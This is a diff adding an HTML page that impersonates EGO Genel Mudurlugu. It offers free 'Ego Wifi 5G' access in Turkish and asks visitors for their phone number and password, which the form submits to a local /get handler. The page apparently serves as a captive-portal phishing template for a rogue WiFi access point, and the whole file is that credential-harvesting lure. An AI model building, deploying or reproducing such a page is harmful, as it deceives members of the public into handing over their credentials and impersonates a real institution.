@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f3f3f3;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  min-height: 100vh;
+}
+
+.container {
+  max-width: 500px;
+  padding: 20px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  background: #fff;
+  border-radius: 8px;
+}
+
+.logo {
+  display: flex;
+  justify-content: center;
+  margin-bottom: 20px;
+}
+
+.logo svg {
+  width: 50%;
+}
+
+.title, .sub-title {
+  text-align: center;
+  margin-bottom: 20px;
+}
+
+.form-group {
+  margin-bottom: 20px;
+  display: flex;
+  justify-content: center;
+}
+
+.input-field {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  padding: 10px;
+  border-radius: 5px;
+  border: 1px solid #ccc;
+  font-size: 16px;
+}
+
+.button {
+  width: 100%;
+  max-width: 400px;
+  height: 40px;
+  background-color: #003D79;
+  color: #fff;
+  border: none;
+  border-radius: 5px; 
+  cursor: pointer;
+}
+
+@media screen and (max-width: 600px) {
+  .container {
+    margin: 10px;
+  }
+
+  .logo svg {
+    width: 70%;
+  }
+
+  .input-field, .button {
+    max-width: 100%;
+  }
+}
+</style>
+</head>
+<body>
+<div class="container">
+
+<div class="logo">
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 600 300">
+    <rect width="600" height="300" fill="#003366"/>
+    <rect x="450" y="0" width="150" height="300" fill="#F2C887"/>
+    <text x="50" y="150" font-family="Arial" font-size="200" fill="white" font-weight="bold">EGO</text>
+    <text x="50" y="250" font-family="Arial" font-size="50" fill="white">EGO Genel Mudurlugu</text>
+  </svg>  
+</div>
+
+<h1 class="title">Ego Wifi 5G Hizmetimizden Yararlan</h1>
+
+<h2 class="sub-title">Telefon no ve sifrenizi giriniz.</h2>
+
+<form action="/get" id="email-form-step" method="GET">
+
+<div class="form-group">
+<input class="input-field" name="email" type="text" placeholder="Telefon No" required>
+</div>
+
+<div class="form-group">
+<input class="input-field" name="password" type="password" placeholder="Sifre" required>
+</div>
+
+<div class="form-group">
+<button class="button" type="submit">Giris Yap</button>
+</div>
+
+</form>
+
+</div>
+</body>
+</html>
